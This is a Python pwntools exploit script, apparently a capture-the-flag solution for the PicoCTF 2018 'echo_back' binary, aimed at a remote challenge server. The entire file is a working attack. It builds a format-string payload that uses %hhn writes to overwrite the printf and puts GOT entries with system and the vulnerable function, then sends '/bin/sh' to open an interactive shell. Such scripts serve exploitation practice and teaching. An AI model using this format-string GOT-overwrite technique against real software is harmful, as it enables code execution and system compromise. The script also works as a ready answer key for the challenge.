from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('PicoCTF_2018_echo_back')
io = remote('node4.buuoj.cn', 28076)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('PicoCTF_2018_echo_back')
vuln = elf.sym['vuln']
system_plt = elf.plt['system']
printf_got = elf.got['printf']
puts_got = elf.got['puts']
fini_array = 0x08049F0C

# gdb.attach(io)
payload = b''
for i in range(4):
    payload += p32(printf_got + i)
for i in range(4):
    payload += p32(puts_got + i)
# payload += p32(fini_array)
cur_num = len(payload)

for i in range(4):
    target_num = (system_plt >> (i * 8)) & 0xff
    if target_num > cur_num:
        payload += b'%' + str.encode(str(target_num - cur_num)) + b'c'
    else:
        payload += b'%' + str.encode(str(0x100 + target_num - cur_num)) + b'c'
    cur_num = target_num
    payload += b'%' + str.encode(str(i + 7)) + b'$hhn'

for i in range(4):
    target_num = (vuln >> (i * 8)) & 0xff
    if target_num > cur_num:
        payload += b'%' + str.encode(str(target_num - cur_num)) + b'c'
    else:
        payload += b'%' + str.encode(str(0x100 + target_num - cur_num)) + b'c'
    cur_num = target_num
    payload += b'%' + str.encode(str(i + 11)) + b'$hhn'

io.sendlineafter('input your message:\n', payload)
io.sendafter('input your message:\n', '/bin/sh\x00')
io.interactive()
# pause()

